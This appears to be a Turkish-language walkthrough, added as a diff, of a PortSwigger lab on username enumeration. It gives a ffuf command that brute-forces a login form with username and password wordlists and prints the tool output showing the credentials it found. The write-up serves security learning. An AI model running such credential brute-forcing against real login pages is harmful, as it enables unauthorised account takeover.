@@ -1,0 +1,47 @@
+
+
+Lab: Username enumeration via different responses
+url: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
+
+Analiz:
+    -- Lab bizi bruteforce saldırıya itiyor .
+    -- Burp Suite ile yapılabilir ancak ffuf daha hızlı çalıştığından onunla ilerliyicem
+
+Payload:
+
+ffuf -w username.txt:W1 -w password.txt:W2 -X POST -d "username=W1&password=W2" -u https://0a36009a036ba6038194022400d10019.web-security-academy.net/login -H "Cookie: session=nfLgNDsrfgvfyUwijzF8M4Cxab86tBqI" -mc 302
+     
+     -- Buradaa -mc 302 değeri bize 302 değeri dönen denemeyi getir dememizi sağladı
+
+Saldırı:
+
+
+ffuf -w username.txt:W1 -w password.txt:W2 -X POST -d "username=W1&password=W2" -u https://0a36009a036ba6038194022400d10019.web-security-academy.net/login -H "Cookie: session=nfLgNDsrfgvfyUwijzF8M4Cxab86tBqI" -mc 302
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : https://0a36009a036ba6038194022400d10019.web-security-academy.net/login
+ :: Wordlist         : W1: /home/erdem/GitHub/Broken Authentication/Lab_1/username.txt
+ :: Wordlist         : W2: /home/erdem/GitHub/Broken Authentication/Lab_1/password.txt
+ :: Header           : Cookie: session=nfLgNDsrfgvfyUwijzF8M4Cxab86tBqI
+ :: Data             : username=W1&password=W2
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 302
+________________________________________________
+
+[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 467ms]
+    * W1: argentina
+    * W2: 7777777
+
